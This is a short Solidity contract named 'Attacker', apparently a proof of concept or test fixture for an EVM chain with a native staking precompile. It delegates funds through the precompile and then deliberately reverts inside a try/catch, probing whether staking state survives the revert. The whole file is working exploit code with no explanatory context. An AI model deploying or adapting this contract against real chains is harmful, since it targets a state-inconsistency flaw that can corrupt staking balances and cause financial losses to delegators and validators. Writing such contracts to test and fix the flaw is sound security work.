// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IStaking} from "./precompiles/IStaking.sol";

contract Attacker {
    address constant STAKING_PRECOMPILE_ADDRESS = 0x0000000000000000000000000000000000001005;
    IStaking public StakingPrecompile;

    constructor() {
        StakingPrecompile = IStaking(STAKING_PRECOMPILE_ADDRESS);
    }

    function attack(string memory valAddress) public payable {
        try this.delegateRevert(valAddress) {} catch {}
    }

    function delegateRevert(string memory valAddress) public payable {
        StakingPrecompile.delegate{value: msg.value}(valAddress);
        revert("attack");
    }
}